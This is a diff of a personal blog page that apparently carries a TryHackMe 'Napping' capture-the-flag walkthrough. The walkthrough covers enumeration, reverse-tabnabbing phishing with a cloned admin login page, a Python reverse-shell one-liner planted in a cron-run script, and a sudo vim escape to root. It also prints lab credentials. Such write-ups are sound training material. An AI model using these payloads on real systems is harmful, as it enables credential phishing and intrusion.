@@ -5,19 +5,18 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Napping - THM | Shebu 🔽</title>
+<title>Napping - THM | Shebu</title>
 <meta name="keywords" content="tabnabbing, vim, phishing, misconfiguration">
 <meta name="description" content="Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel&rsquo;s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.">
 <meta name="author" content="Shebu">
-<link rel="canonical" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/">
-<link crossorigin="anonymous" href="/themes/hugo-PaperMod/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
-<script defer crossorigin="anonymous" src="/themes/hugo-PaperMod/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
-    onload="hljs.initHighlightingOnLoad();"></script>
-<link rel="icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/apple-touch-icon.png">
-<link rel="mask-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/safari-pinned-tab.svg">
+<link rel="canonical" href="https://sh3bu.github.io/posts/napping/">
+<meta name="google-site-verification" content="GTM-NNK933J">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7140587df96a2b1a49eb723fa7063dc0c641a6cb638f3140e8d3beb4deae4f5c.css" integrity="sha256-cUBYfflqKxpJ63I/pwY9wMZBpstjjzFA6NO&#43;tN6uT1w=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://sh3bu.github.io/img/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/img/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/img/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://sh3bu.github.io/img/apple-touch-icon.png">
+<link rel="mask-icon" href="https://sh3bu.github.io/img/apple-touch-icon.png">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
 <noscript>
@@ -56,16 +55,27 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="Napping - THM" />
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-T6XL9391MH"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-T6XL9391MH', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="Napping - THM" />
 <meta property="og:description" content="Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel&rsquo;s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/" />
-<meta property="og:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/napping.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://sh3bu.github.io/posts/napping/" />
+<meta property="og:image" content="https://sh3bu.github.io/img/napping.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-03-24T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-03-24T00:00:00+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/img/napping.png" />
+<meta name="twitter:image" content="https://sh3bu.github.io/img/napping.png" />
 <meta name="twitter:title" content="Napping - THM"/>
 <meta name="twitter:description" content="Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel&rsquo;s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root."/>
 
@@ -74,18 +84,18 @@
 {
   "@context": "https://schema.org",
   "@type": "BreadcrumbList",
-  "itemListElement": [, 
+  "itemListElement": [
     {
       "@type": "ListItem",
-      "position":  2 ,
+      "position":  1 ,
       "name": "Posts",
-      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/"
+      "item": "https://sh3bu.github.io/posts/"
     }, 
     {
       "@type": "ListItem",
-      "position":  3 ,
+      "position":  2 ,
       "name": "Napping - THM",
-      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/"
+      "item": "https://sh3bu.github.io/posts/napping/"
     }
   ]
 }
@@ -103,7 +113,7 @@
   "articleBody": "Napping is a medium difficulty box from TryHackMe which had a interesting vulnerability called Tab Nabbing to phish the admin of the website to get user daniel’s credentials by which we could ssh into the box. We then alter a python file which is run every minute by user adrian to get a reverse shell back as that user. For root, we could execute vim as root . So we refer GTFOBINS for sudo entry for vim binary to elevate our privileges to root.\nRoom Napping OS Linux Difficulty Medium Room Link https://tryhackme.com/room/nappingis1337 Creator hadrian3689 Enumeration Portscan ──(root💀kali)-[~/thm/napping] └─# rustscan -a 10.10.247.40 -- -sV -sC -oN napping.nmap .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-' The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 Nmap scan report for 10.10.247.40 Host is up, received reset ttl 63 (0.24s latency). Scanned at 2022-03-23 06:39:55 EDT for 13s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk= | 256 c2:7b:a9:0c:28:7c:d1💿03:23:f4:a8:bc:02:72:4b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ= | 256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds So there are 2 ports running\n-\u003e 22 - OpenSSH 8.2p1\n-\u003e 80- Apache httpd 2.4.41\nWebsite - port 80 The webpage had just a simple login \u0026 sign up page.\nlogin page - signup page - I tried default credentials, basic sql injection but those didn’t work so I quickly went on to create an account \u0026 logged into the site.\nWe were greeted with a welcome.php page where we could submit a blog link \u0026 as the site says the blog link which we submitted will be reviewed by the admin.\nWhen I entered my website link ,it is displayed back for us to review it.\nOnce clicked it will open the link we submitted in a new tab.\nDirectory bruteforce ┌──(root💀kali)-[~/thm/napping] └─# feroxbuster -u http://10.10.247.40/ -w /usr/share/wordlists/dirb/common.txt -x php -C 403 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.247.40/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💢 Status Code Filters │ [403] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 9l 28w 312c http://10.10.247.40/admin =\u003e http://10.10.247.40/admin/ 200 GET 1l 0w 1c http://10.10.247.40/config.php 200 GET 0l 0w 0c http://10.10.247.40/admin/config.php 200 GET 38l 82w 1211c http://10.10.247.40/index.php 302 GET 0l 0w 0c http://10.10.247.40/logout.php =\u003e index.php 200 GET 38l 76w 1158c http://10.10.247.40/admin/login.php 302 GET 0l 0w 0c http://10.10.247.40/admin/logout.php =\u003e login.php 200 GET 42l 104w 1567c http://10.10.247.40/register.php 302 GET 0l 0w 0c http://10.10.247.40/welcome.php =\u003e index.php 302 GET 0l 0w 0c http://10.10.247.40/admin/welcome.php =\u003e login.php [####################] - 49s 18452/18452 0s found:10 errors:0 So we have some interesting directories /admin \u0026 /admin/login.php\nThe /admin directory showed 403 but we were able to access the admin login page which is at /admin/login.php\nforbidden page - admin login page - Shell as daniel Tab Nabbing After this I was stuck for a while then I decided to google the name of the room like - “napping exploit” \u0026 then I got many results which was about Tab nabbing - a web vulnerability which may cause a phishing attack .\nTAB NABBING: Reverse tabnabbing, or simply tabnabbing, is a phishing attack in which an attacker fools a victim into entering their credentials on a fake website controlled by the attacker\nReverse tabnabbing attacks are possible on websites that enable users to post links that, when clicked, open in a new tab. The link is opened in a new tab because of the link’s target=\"_blank\" property.\nA regular way to abuse this behaviour would be to change the location of window.opener.location = https://attacker.com/victim.html to a web controlled by the attacker that looks like the original one, so it can imitate the login form of the original website and ask for credentials to the user.\nYou could read more on how to exploit it here -\u003e Hacktricks\nSo the idea here is by using Tab Nabbing we could post a malicious link pointing to a fake admin login page of the website from our end, assuming that when the admin clicks on our link, he will get redirected to a new tab which has the fake admin login page of ours and enter his credentials thinking that he had accidentally logged out .\nSteps Create a file called malicious.html with the following contents \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cscript\u003e window.opener.location = \"http://:8000/phishing.html\"; \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e This will redirect the user who clicks it to the phishing.html page in a new tab.\nCopy the source code of admin login page and save it as phishing.html which will trick the admin to enter his credentials. \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eLogin\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\"\u003e \u003cstyle\u003e body{ font: 14px sans-serif; } .wrapper{ width: 360px; padding: 20px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"wrapper\"\u003e \u003ch2\u003eAdmin Login\u003c/h2\u003e \u003cp\u003ePlease fill in your credentials to login.\u003c/p\u003e \u003cform action=\"/admin/login.php\" method=\"post\"\u003e \u003cdiv class=\"form-group\"\u003e \u003clabel\u003eUsername\u003c/label\u003e \u003cinput type=\"text\" name=\"username\" class=\"form-control \" value=\"\"\u003e \u003cspan class=\"invalid-feedback\"\u003e\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"form-group\"\u003e \u003clabel\u003ePassword\u003c/label\u003e \u003cinput type=\"password\" name=\"password\" class=\"form-control \"\u003e \u003cspan class=\"invalid-feedback\"\u003e\u003c/span\u003e \u003c/div\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput type=\"submit\" class=\"btn btn-primary\" value=\"Login\"\u003e \u003c/div\u003e \u003cbr\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e Serve those files by spinning up a web server - python3 -m http.server 8000\nSubmit the link http://:8000/malicious.html in the website.\nRun wireshark to capture tun0 packets\nNow all we have to do is to wait for 2-3 mins for the admin to fall in our trap! kekw\nAfter few mins I got requests from the server for both of the fake html pages I created which essentially means the admin did visit our fake login page!\n┌──(root💀kali)-[~/thm/napping] └─# python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.194.37 - - [24/Mar/2022 04:13:54] \"GET /malicious.html HTTP/1.1\" 200 - 10.10.194.37 - - [24/Mar/2022 04:13:54] \"GET /phishing.html HTTP/1.1\" 200 - 10.10.194.37 - - [24/Mar/2022 04:13:55] code 501, message Unsupported method ('POST') Interesting thing to see here is that there is a POST request sent back to us. Lets check wireshark for more information about that .\nRight click on the POST request and select Follow -\u003e TCP stream\nYay we got a username called daniel \u0026 his password.\nUsing the credentials I was able to SSH in to machine as daniel .\n┌──(root💀kali)-[~/thm/napping] └─# ssh daniel@10.10.194.37 The authenticity of host '10.10.194.37 (10.10.194.37)' can't be established. ED25519 key fingerprint is SHA256:JofRko6/RC6xnBRFyh6aSMX+ospLetfcod6d05kXQQU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.194.37' (ED25519) to the list of known hosts. daniel@10.10.194.37's password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 24 Mar 2022 05:50:13 AM UTC System load: 0.0 Processes: 113 Usage of /: 56.9% of 8.90GB Users logged in: 0 Memory usage: 60% IPv4 address for eth0: 10.10.194.37 Swap usage: 0% 10 updates can be applied immediately. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Wed Mar 16 00:41:48 2022 from 10.0.2.26 daniel@napping:~$ id uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators) We are a part of administrators group\nThere are 3 users on the machine root, daniel \u0026 adrian\nShell as adrian daniel@napping:/home/adrian$ cat /etc/passwd | grep bash root❌0:0:root:/root:/bin/bash adrian❌1000:1000:adrian:/home/adrian:/bin/bash daniel❌1001:1001::/home/daniel:/bin/bash We need to escalate our privileges to adrian to get the user flag.\nPoking around the machine I found config.php at /var/www/html which had username \u0026 a password\ndaniel@napping:/var/www/html$ cat config.php \u003c?php /* Database credentials. Assuming you are running MySQL server with default setting (user 'root' with no password) */ define('DB_SERVER', 'localhost'); define('DB_USERNAME', 'adrian'); define('DB_PASSWORD', 'Stop@Napping3!'); define('DB_NAME', 'website'); . . . With the help of these credentials I was able to login to mysql@localhost but found nothing quite interesting there.\nVisiting the home dir of adrian,\ndaniel@napping:/home/adrian$ ls -al total 44 drwxr-xr-x 4 adrian adrian 4096 Mar 24 06:00 . drwxr-xr-x 4 root root 4096 Mar 15 23:28 .. lrwxrwxrwx 1 root root 9 Mar 16 00:39 .bash_history -\u003e /dev/null -rw-r--r-- 1 adrian adrian 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 adrian adrian 3771 Feb 25 2020 .bashrc drwx------ 2 adrian adrian 4096 Mar 15 23:28 .cache lrwxrwxrwx 1 root root 9 Mar 16 00:40 .mysql_history -\u003e /dev/null -rw-r--r-- 1 adrian adrian 807 Feb 25 2020 .profile -rw-rw-r-- 1 adrian administrators 480 Mar 16 00:02 query.py -rw-rw-r-- 1 adrian adrian 75 Mar 16 00:38 .selected_editor -rw-rw-r-- 1 adrian adrian 224 Mar 24 06:06 site_status.txt drwx------ 2 adrian adrian 4096 Mar 15 23:27 .ssh -rw-r--r-- 1 adrian adrian 0 Mar 15 23:28 .sudo_as_admin_successful -rw-r----- 1 root adrian 56 Mar 16 00:33 user.txt -rw------- 1 adrian adrian 0 Mar 16 00:40 .viminfo We have the user.txt her. We can view and edit the query.py file since we are a part of administrators group.\nosquery.py\nfrom datetime import datetime import requests now = datetime.now() r = requests.get('http://127.0.0.1/') if r.status_code == 200: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Site is Up: \") f.write(dt_string) f.write(\"\\n\") f.close() else: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Check Out Site: \") f.write(dt_string) f.write(\"\\n\") f.close() The site_status.txt file hints that this script might be running in the background every minute.\nsite_status.txt\ndaniel@napping:/home/adrian$ cat site_status.txt Site is Up: 24/03/2022 06:31:01 Site is Up: 24/03/2022 06:32:02 Site is Up: 24/03/2022 06:33:01 Site is Up: 24/03/2022 06:34:02 Site is Up: 24/03/2022 06:35:01 Site is Up: 24/03/2022 06:36:02 Site is Up: 24/03/2022 06:37:01 Site is Up: 24/03/2022 06:38:02 Site is Up: 24/03/2022 06:39:01 Lets add a python reverse shell oneliner at the end of the osquery.py script.\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\") user.txt 🚩 After a minute we got a reverse shell back as adrian. Go ahead and grab the user.txt 🚩\n┌──(root💀kali)-[/opt/peas] └─# nc -lvnp 9001 127 ⨯ Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::9001 Ncat: Listening on 0.0.0.0:9001 Ncat: Connection from 10.10.35.41. Ncat: Connection from 10.10.35.41:46982. adrian@napping:~$ id uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators) adrian@napping:~$ cat user.txt THM{Wh@T_1S_*******PriViL36E} Shell as root Running sudo -l reveals that we could run vim as root.\nadrian@napping:~$ sudo -l Matching Defaults entries for adrian on napping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User adrian may run the following commands on napping: (root) NOPASSWD: /usr/bin/vim root.txt 🚩 We refer GTFOBINS to check sudo entry for vim.\nRun sudo /usr/bin/vim -c ':!/bin/sh' to obtain root shell . Grab the root.txt flag 🎉\n# id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt THM{Adm1n$__******tsk_tSK} ",
   "wordCount" : "1920",
   "inLanguage": "en",
-  "image":"https://sh3bu.github.io/themes/hugo-PaperMod/img/napping.png","datePublished": "2022-03-24T00:00:00Z",
+  "image":"https://sh3bu.github.io/img/napping.png","datePublished": "2022-03-24T00:00:00Z",
   "dateModified": "2022-03-24T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -111,14 +121,14 @@
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/"
+    "@id": "https://sh3bu.github.io/posts/napping/"
   },
   "publisher": {
     "@type": "Organization",
-    "name": "Shebu 🔽",
+    "name": "Shebu",
     "logo": {
       "@type": "ImageObject",
-      "url": "https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico"
+      "url": "https://sh3bu.github.io/img/favicon.ico"
     }
   }
 }
@@ -140,7 +150,9 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://sh3bu.github.io/themes/hugo-PaperMod" accesskey="h" title="Shebu 🔽 (Alt + H)">Shebu 🔽</a>
+            <a href="https://sh3bu.github.io/" accesskey="h" title="Shebu&#39;s Blog (Alt + H)">
+                <img src="https://sh3bu.github.io/img/goku.png" alt="" aria-label="logo"
+                    height="90">Shebu&#39;s Blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -166,17 +178,17 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/archives" title="Archive">
+                <a href="https://sh3bu.github.io/archives" title="Archive">
                     <span>Archive</span>
                 </a>
             </li>
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://sh3bu.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
             <li>
-                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/" title="Tags">
+                <a href="https://sh3bu.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
@@ -187,7 +199,7 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://sh3bu.github.io/themes/hugo-PaperMod">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://sh3bu.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/posts/">Posts</a></div>
     <h1 class="post-title">
       Napping - THM
     </h1>
@@ -196,8 +208,8 @@
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="lazy" srcset="https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_360x0_resize_box_3.png 360w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_480x0_resize_box_3.png 480w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_720x0_resize_box_3.png 720w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_1080x0_resize_box_3.png 1080w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping.png 1115w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/themes/hugo-PaperMod/posts/napping/img/napping.png" alt="" 
+        <img loading="lazy" srcset="https://sh3bu.github.io/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_360x0_resize_box_3.png 360w ,https://sh3bu.github.io/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_480x0_resize_box_3.png 480w ,https://sh3bu.github.io/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_720x0_resize_box_3.png 720w ,https://sh3bu.github.io/posts/napping/img/napping_hu7a452ef206008b0f9088a36597aec9a7_151238_1080x0_resize_box_3.png 1080w ,https://sh3bu.github.io/posts/napping/img/napping.png 1115w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/posts/napping/img/napping.png" alt="" 
             width="1115" height="628">
         <p><text></p>
 </figure><div class="toc">
@@ -282,48 +294,48 @@
 <h1 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h1>
 <hr>
 <h2 id="portscan">Portscan<a hidden class="anchor" aria-hidden="true" href="#portscan">#</a></h2>
-<pre tabindex="0"><code>──(root💀kali)-[~/thm/napping]
-└─# rustscan -a 10.10.247.40 -- -sV -sC -oN napping.nmap              
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
-The Modern Day Port Scanner.
-________________________________________
-: https://discord.gg/GFrQsGy           :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-Nmap? More like slowmap.🐢
-
-
-Nmap scan report for 10.10.247.40
-Host is up, received reset ttl 63 (0.24s latency).
-Scanned at 2022-03-23 06:39:55 EDT for 13s
-
-PORT   STATE SERVICE REASON         VERSION
-22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk=
-|   256 c2:7b:a9:0c:28:7c:d1💿03:23:f4:a8:bc:02:72:4b (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ=
-|   256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM
-80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Login
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
-</code></pre><p>So there are 2 ports running</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">──(root💀kali)-[~/thm/napping]
+</span></span><span class="line"><span class="cl">└─# rustscan -a 10.10.247.40 -- -sV -sC -oN napping.nmap              
+</span></span><span class="line"><span class="cl">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span class="line"><span class="cl">| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+</span></span><span class="line"><span class="cl">| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+</span></span><span class="line"><span class="cl">`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
+</span></span><span class="line"><span class="cl">The Modern Day Port Scanner.
+</span></span><span class="line"><span class="cl">________________________________________
+</span></span><span class="line"><span class="cl">: https://discord.gg/GFrQsGy           :
+</span></span><span class="line"><span class="cl">: https://github.com/RustScan/RustScan :
+</span></span><span class="line"><span class="cl"> --------------------------------------
+</span></span><span class="line"><span class="cl">Nmap? More like slowmap.🐢
+</span></span><span class="line"><span class="cl">
